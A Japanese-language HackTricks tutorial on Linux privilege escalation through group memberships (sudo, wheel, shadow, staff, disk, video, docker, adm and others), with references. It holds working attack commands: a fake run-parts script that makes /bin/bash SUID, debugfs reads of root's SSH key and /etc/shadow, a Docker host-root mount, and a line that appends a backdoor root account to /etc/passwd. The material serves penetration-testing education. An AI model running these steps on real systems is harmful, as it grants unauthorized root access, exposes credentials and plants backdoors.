# 興味深いグループ - Linux Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Sudo/Admin グループ

### **PE - Method 1**

**場合によっては**、システムの **/etc/sudoers** ポリシー（またはそこから読み込まれるファイル）に、次のようなエントリが含まれています:<sup>[[3]](#references)</sup>

```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```

これは、どちらかのエントリに一致するユーザーは、`sudo`を通じて任意のターゲットユーザーとして任意のコマンドを実行できることを意味します（ポリシーのその他の条件に従います）。<sup>[[3]](#references)</sup>

この場合、**rootになるには次を実行するだけです**:

```
sudo su
```

`sudo -l` でユーザー名のみを指定した制限付きの `adduser` 呼び出しが許可されている場合、まだ存在しない同名のプライマリグループが作成されるか確認してください。そのグループに属する新しいアカウントは、実効 sudoers ポリシーで `%group` にすでに権限が付与されていれば、特権を得られる可能性があります。エスカレーション経路と判断する前に、グループが作成されることとグループルールの両方を確認してください。アカウントの作成はシステムに変更を加えるため、まずポリシーを確認してください。

### PE - Method 2

すべての suid バイナリを探し、**Pkexec** バイナリがあるか確認します:

```bash
find / -perm -4000 2>/dev/null
```

**pkexec が SUID バイナリ**の場合、polkit が要求されたアクションを許可したときに限り、別のユーザーとしてプログラムを実行できます。SUID bit が設定されているだけで root 権限が得られるわけではありません。**sudo** や **admin** グループへの所属だけで十分だと決めつけず、インストール済みのポリシーと対象セッションの認可を確認してください。<sup>[[4]](#references)[[5]](#references)</sup>

別の [CVE-2021-4034](https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt) の経路では、まず `pkexec` が実行可能な **root 所有の SUID** ファイルであることを確認してください。その bit が設定されていないインストール済みバイナリは、アドバイザリに記載されたローカル SUID 権限昇格には該当しません。上流のバージョン文字列は手掛かりにすぎません。ディストリビューションは[古いパッケージバージョンに修正をバックポートする](https://ubuntu.com/security/CVE-2021-4034)場合があるため、脆弱と判断する前に、インストール済みのベンダーパッケージと緩和策を確認してください。

[CVE-2021-3560](https://securitylab.github.com/advisories/GHSL-2021-074-polkit/) は別の polkit の経路であり、`pkexec` の SUID 脆弱性ではなく、D-Bus 認可の競合状態です。インストール済みのベンダー版 polkit パッケージと、到達可能な特権 D-Bus アクションで有用な変更を実行できるかを確認してください。アカウント作成の経路には AccountsService などの適切なサービスも必要です。また、新しいグループに sudo アクセスが付与されるかどうかは、実際に適用される sudo ポリシーによって異なります。報告されている polkit のバージョンやサービスのインストールだけでは、候補にすぎません。特に、ベンダーが[修正をバックポートしている](https://access.redhat.com/security/cve/cve-2021-3560)場合は注意してください。パッシブな列挙でこの競合状態を発生させてはいけません。

古い Local Authority バックエンドを引き続き使用するディストリビューションでは、次のコマンドでグループルールを確認してください。

```bash
cat /etc/polkit-1/localauthority.conf.d/*
```

ディストリビューションによって関連するグループ名やデフォルト設定は異なります。この用途でグループが役立つのは、ローカルポリシーでそのグループが指定されている場合に限られます。<sup>[[5]](#references)</sup>

**rootになるには、次を実行できます**:

```bash
pkexec "/bin/sh" #Authentication is required according to the local policy
```

**pkexec**を実行しようとして、次の**エラー**が表示された場合:

```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```

SSH セッションで認証エージェントが登録されていない場合、ポリシー上は操作が許可されるはずでも、`pkexec` がこのエラーで失敗することがあります。polkit は、デスクトップ環境以外のセッション向けのテキスト認証エージェントとして `pkttyagent` を案内しています。実際の挙動はバージョンやディストリビューションによって異なるため、ローカルのポリシーとエージェントの設定を確認してください。影響を受ける一部の NixOS バージョンで報告されている回避策は、**2 つの異なる SSH セッション**を使用する方法です。<sup>[[1]](#references)[[4]](#references)[[5]](#references)</sup>

あるアカウントによる `su` へのアクセスを拒否する ACL が制御するのは、その実行ファイルであり、管理者権限で許可される操作へのすべての経路ではありません。管理者の認証情報が別の経路で漏えいしている場合は、`systemd-run` による一時的なシステムサービスの起動など、別の操作が実効 polkit ポリシーで許可されているか、認証エージェントがどのユーザーの認証を受け付けるか、起動されるサービスがどのユーザーとして実行されるかを確認してください。[polkit は、セッション所有者としての認証と管理者としての認証を区別します](https://polkit.pages.freedesktop.org/polkit/polkit.8.html)。また、[systemd-run はシステムマネージャーに一時的なサービスを要求できます](https://systemd.io/CONTROL_GROUP_INTERFACE/)。履歴の記録、コマンドのインストール、またはポリシーファイルを読み取れることだけでは、認可や認証情報の有効性は確認できません。受動的な調査では、認証情報を入力したりユニットを起動したりしないでください。

```bash:session1
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```

```bash:session2
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```

## Wheel グループ

sudoers ポリシーに、次のエントリが含まれている場合もあります。

```
%wheel	ALL=(ALL:ALL) ALL
```

これは、そのエントリに一致するユーザーが、`sudo` を使って任意の対象ユーザーとして任意のコマンドを実行できることを意味します（ポリシーの残りの条件に従います）。<sup>[[3]](#references)</sup>

この場合、**root になるには、次を実行するだけです**：

```
sudo su
```

## Shadow グループ

権限によって許可されているシステムでは、**shadow** グループのユーザーは **/etc/shadow** を**読み取り**できます。対象の mode と ACL を確認してください:<sup>[[6]](#references)[[7]](#references)</sup>

```
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```

それでは、ファイルを読み、**いくつかのハッシュをクラック**してみましょう。

ハッシュを確認する際のロック状態に関する補足:
- `!` または `*` を含むエントリでは、通常、パスワードでの非対話型ログインはできません。
- `!hash` はパスワードがロックされていたことを意味します。残りの文字列は、ロック前のパスワードフィールドを表します。
- `*` を含むフィールドは有効な `crypt(3)` ハッシュではなく、UNIXパスワードでのログインを防ぎます。これだけを根拠に、以前パスワードが設定されていたかどうかを判断しないでください。
直接ログインできない場合でも、アカウントの分類に役立ちます。<sup>[[6]](#references)</sup>

## staff グループ

**staff**: ユーザーがroot権限なしでシステム（`/usr/local`）にローカルな変更を加えられるようにします（`/usr/local/bin` 内の実行ファイルはすべてのユーザーのPATH変数に含まれるため、同じ名前の `/bin` や `/usr/bin` 内の実行ファイルを「上書き」する場合がある点に注意してください）。監視やセキュリティにより関連する「adm」グループと比較してください。<sup>[[2]](#references)[[7]](#references)</sup>

以下の例のように、`/usr/local/bin` が `/usr/bin` より前にあるDebianの設定では、コマンド名だけを指定すると、まず `/usr/local/bin` 内のコピーが実行されます。対象システムで実際に有効な `PATH` を確認してください。

```bash
$ echo $PATH
/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games

# echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

特権プロセスが書き込み可能な `/usr/local/bin` 経由でパス指定なしのコマンドを解決する場合、そのコマンドを置き換えるとプロセスの権限で実行される可能性があります。テストの前に、実際のパスと実行されるタイミングを確認してください。

Ubuntu システムでは、ログイン時に `pam_motd` が `run-parts --lsbsysinit` を介して実行可能なスクリプトを root として実行します。cron ジョブでも `run-parts` が使われる場合がありますが、これはディストリビューションと設定によって異なります。<sup>[[10]](#references)[[11]](#references)</sup>

```bash
$ cat /etc/crontab | grep run-parts
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
```

新しい SSH ログイン時に、`pspy` を使うと、このパスがターゲット上で実際に呼び出されるか確認できます。root 権限なしでプロセスのコマンドラインを監視できます。<sup>[[10]](#references)[[12]](#references)</sup>

```bash
$ pspy64
2024/02/01 22:02:08 CMD: UID=0     PID=1      | init [2]
2024/02/01 22:02:10 CMD: UID=0     PID=17883  | sshd: [accepted]
2024/02/01 22:02:10 CMD: UID=0     PID=17884  | sshd: [accepted]
2024/02/01 22:02:14 CMD: UID=0     PID=17886  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17887  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17888  | run-parts --lsbsysinit /etc/update-motd.d
2024/02/01 22:02:14 CMD: UID=0     PID=17889  | uname -rnsom
2024/02/01 22:02:14 CMD: UID=0     PID=17890  | sshd: mane [priv]
2024/02/01 22:02:15 CMD: UID=0     PID=17891  | -bash
```

**Exploit**

```bash
# 0x1 Add a run-parts script in /usr/local/bin/
$ vi /usr/local/bin/run-parts
#! /bin/bash
chmod 4777 /bin/bash

# 0x2 Don't forget to add a execute permission
$ chmod +x /usr/local/bin/run-parts

# 0x3 start a new ssh sesstion to trigger the run-parts program

# 0x4 check premission for `u+s`
$ ls -la /bin/bash
-rwsrwxrwx 1 root root 1099016 May 15  2017 /bin/bash

# 0x5 root it
$ /bin/bash -p
```

## Disk グループ

**disk** グループへの所属により、ブロックデバイスへの raw access が許可されることがあり、多くの場合 **root access に近い権限**を得られます。Debian ではおおむね root と同等と説明されていますが、対象上の実際のデバイス権限とストレージ構成を確認してください。<sup>[[7]](#references)</sup>

一般的なデバイスパスには `/dev/sd*` がありますが、NVMe などでは異なる名前が使われます。

```bash
df -h #Find where "/" is mounted
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```

`debugfs` は ext2/ext3/ext4 ファイルシステム上で動作します。上記の `/root` や `/etc/shadow` などのパスは、開いたファイルシステム内のファイルを指し、`dump` の2番目の引数はネイティブファイルシステム上の出力パスです。<sup>[[8]](#references)</sup> たとえば、開いたファイルシステムから `/tmp/asd1.txt` をネイティブファイルシステム上の `/tmp/asd2.txt` に抽出するには、次のようにします。

```bash
debugfs /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```

`-w` オプションはファイルシステムを読み書き可能な状態で開き、`write` コマンドはネイティブファイルを開いたファイルシステムにコピーします。マウント中の稼働中ファイルシステムで使用すると、直接編集によってファイルシステムが破損する可能性があるため、可能な場合はオフラインイメージを使用してください。<sup>[[8]](#references)</sup>

```bash
debugfs -w /dev/sda1
debugfs:  write /tmp/asd1.txt /tmp/asd2.txt
```

## Video グループ

`w` コマンドを使うと、**システムにログインしているユーザー**を確認でき、次のような出力が表示されます。<sup>[[20]](#references)</sup>

```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```

**tty1** エントリは Linux の最初の仮想コンソールを示しますが、それだけでユーザーが物理的にマシンの前にいることを証明するものではありません。特にコンテナやその他の環境では当てはまりません。<sup>[[21]](#references)</sup>

読み取り可能な framebuffer デバイスを公開しているシステムでは、**video** グループへの所属によって、そのデバイスへのアクセスが許可される場合があります。Linux framebuffer インターフェースのドキュメントでは、`/dev/fb0` は画面のスナップショットを取得するためにコピーできる読み取り可能なメモリデバイスとして説明されています。`/sys/class/graphics/fb0/virtual_size` パスは、その fbdev sysfs 属性が存在する場合にのみ利用できるため、まず対象システムを確認してください。<sup>[[7]](#references)[[9]](#references)</sup>

```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```

インストールされている **GIMP** のバージョンで raw-data importer が利用できる場合は、それを使って **`screen.raw`** を開きます。対応状況や操作方法は、バージョンやプラグインによって異なります。<sup>[[22]](#references)</sup>

![ディスクグループ - ビデオグループ: raw画像を開くには、GIMPを使い、screen.rawファイルを選択して、ファイルの種類としてRaw image dataを選択します](<../../../images/image (463).png>)

画像の幅と高さをフレームバッファのジオメトリに合わせます。出力が読み取れるようになるまで、利用可能なピクセル形式/Image Typesを試します。<sup>[[9]](#references)</sup>

![ディスクグループ - ビデオグループ: 次に、幅と高さを画面で使われている値に変更し、さまざまなImage Typesを試します（画面が最もよく表示されるものを選択します）](<../../../images/image (317).png>)

## rootグループ

**root** グループに所属していてもrootのUIDが付与されるわけではありませんが、特権サービスやライブラリが使用する場合、`root` が所有するグループ書き込み可能なファイルが重要となることがあります。権限昇格の経路として扱う前に、ファイルの実際の権限と用途を確認してください。

**rootグループのメンバーが変更できるファイルを確認する**:

```bash
find / -group root -perm -g=w 2>/dev/null
```

## Docker グループ

`docker` グループに所属すると、標準的な rootful インストールでは Docker daemon に対する root レベルのアクセス権が付与されます。bind mount はデフォルトで読み書き可能なため、daemon を制御できるユーザーはホストの `/` をコンテナにマウントしてホスト上のファイルを変更できます。これにより、実質的にホスト上で root 権限を得られます。<sup>[[13]](#references)[[14]](#references)[[15]](#references)</sup>

グループへの所属状況が、`/etc/group`、`/etc/gshadow`、現在のプロセストークンの間で一致していない場合があります。ユーザーが `id -nG` に表示されないのに `newgrp docker` が成功する場合は、新しいシェルで `id` が表示するグループを確認し、Docker socket に実際に書き込み可能か、rootful daemon に接続されているかをテストしてください。グループ名だけではホストを制御できるとは限りません。自動化された `newgrp` の確認には制限時間を設け、パスワードプロンプトによって列挙が停止しないようにしてください。

```bash
docker image #Get images from the docker service

#Get a shell inside a docker container with access as root to the filesystem
docker run -it --rm -v /:/mnt <imagename> chroot /mnt bash
#If you want full access from the host, create a backdoor in the passwd file
echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/passwd

#Ifyou just want filesystem and network access you can startthe following container:
docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bash
```

最後に、先ほどの提案がどれも気に入らない場合や、何らかの理由（docker api firewall など）でうまくいかない場合は、ここで説明されているように、**privileged container を実行してそこから escape する**方法も試せます。

{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

docker socket への書き込み権限がある場合は、[**docker socket を悪用して権限昇格する方法についてのこの記事**](../../linux-basics/linux-privilege-escalation/index.html#writable-docker-socket)**を読んでください。**

{{#ref}}
https://github.com/KrustyHack/docker-privilege-escalation
{{#endref}}

{{#ref}}
https://fosterelli.co/privilege-escalation-via-docker.html
{{#endref}}

## lxc/lxd グループ

{{#ref}}
lxd-privilege-escalation.md
{{#endref}}

## Adm グループ

通常、**`adm`** グループの**メンバー**は、_/var/log/_ 内にある**ログ**ファイルを**読み取る**権限を持っています。\
したがって、このグループに属するユーザーを侵害した場合は、必ず**ログを確認**してください。<sup>[[7]](#references)</sup>

## Backup / Operator / lp / Mail グループ

これらのグループの意味は、サービスやディストリビューションによって異なります。Debian では、`backup` は委任されたバックアップ／復元、`lp` はプリンターデーモン、`mail` は `/var/mail` 用として説明されています。グループメンバーシップを権限昇格の経路と見なす前に、ローカルの権限を確認してください。<sup>[[7]](#references)</sup>

これらは root への直接的な経路というより、**認証情報を見つけるための手がかり**となることがよくあります。
- **backup**: 設定、キー、DB ダンプ、トークンを含むアーカイブが見つかる可能性があります。
- **operator**: プラットフォーム固有の運用アクセスにより、実行時の機密データが漏えいする可能性があります。
- **lp**: 印刷キューやスプールに、文書の内容が含まれている場合があります。
- **mail**: メールスプールから、パスワードリセットリンク、OTP、内部認証情報が見つかる可能性があります。

このグループへの所属は、価値の高いデータ漏えいとして扱い、パスワードやトークンの使い回しを足がかりにしてください。

## Auth グループ

OpenBSD で S/Key が設定されている場合、`/etc/skey` の所有者は `root:auth` であり、記録へのアクセスには `auth` グループへの所属が必要です。YubiKey の記録は `/var/db/yubikey` に保存されます。<sup>[[16]](#references)[[17]](#references)</sup> S/Key または YubiKey が有効な、脆弱な OpenBSD 6.6 の設定では、`auth` 権限を持つローカルユーザーが root になれる可能性がありました。Qualys は前提条件と exploit chain を解説しており、リンク先の PoC はその手順を実装しています。<sup>[[18]](#references)[[19]](#references)</sup>

## References

- [1] [GUI セッションなしでの pkexec/pkttyagent 認証 (NixOS issue #18012)](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903)
- [2] [SystemGroups - Debian Wiki](https://wiki.debian.org/SystemGroups)
- [3] [sudoers(5) — sudo — Debian Manpages](https://manpages.debian.org/bookworm/sudo/sudoers.5.en.html)
- [4] [pkexec — polkit リファレンスマニュアル](https://polkit.pages.freedesktop.org/polkit/pkexec.1.html)
- [5] [polkit — polkit リファレンスマニュアル](https://polkit.pages.freedesktop.org/polkit/polkit.8.html)
- [6] [shadow(5) — Linux マニュアルページ](https://man7.org/linux/man-pages/man5/shadow.5.html)
- [7] [Debian セキュリティマニュアル](https://www.debian.org/doc/manuals/securing-debian-manual/securing-debian-manual.en.pdf)
- [8] [debugfs(8) — Linux マニュアルページ](https://www.man7.org/linux/man-pages/man8/debugfs.8.html)
- [9] [フレームバッファデバイス — Linux Kernel ドキュメント](https://docs.kernel.org/fb/framebuffer.html)
- [10] [update-motd(5) — Ubuntu Manpages](https://manpages.ubuntu.com/manpages/resolute/man5/update-motd.5.html)
- [11] [run-parts(8) — Debian Manpages](https://manpages.debian.org/unstable/debianutils/run-parts.8.en.html)
- [12] [pspy — 権限のないユーザーによる Linux プロセスの監視](https://github.com/DominicBreuker/pspy)
- [13] [Docker Engine のセキュリティ](https://docs.docker.com/engine/security/)
- [14] [root 以外のユーザーとして Docker を管理する](https://docs.docker.com/engine/install/linux-postinstall)
- [15] [コンテナの実行 — Docker Docs](https://docs.docker.com/engine/containers/run/)
- [16] [skey(5) — OpenBSD マニュアルページ](https://man.openbsd.org/skey.5)
- [17] [login_yubikey(8) — OpenBSD マニュアルページ](https://man.openbsd.org/login_yubikey.8)
- [18] [OpenBSD の認証に関する脆弱性 — Qualys セキュリティアドバイザリ](https://www.openwall.com/lists/oss-security/2019/12/04/5)
- [19] [openbsd-authroot — ローカル exploit PoC](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)
- [20] [w(1) — Linux マニュアルページ](https://man7.org/linux/man-pages/man1/w.1.html)
- [21] [Linux の割り当て済みデバイス (4.x 以降)](https://docs.kernel.org/6.16/admin-guide/devices.html)
- [22] [画像のインポートとエクスポート — GIMP ドキュメント](https://docs.gimp.org/3.0/en/gimp-prefs-import-export.html)
{{#include ../../../banners/hacktricks-training.md}}
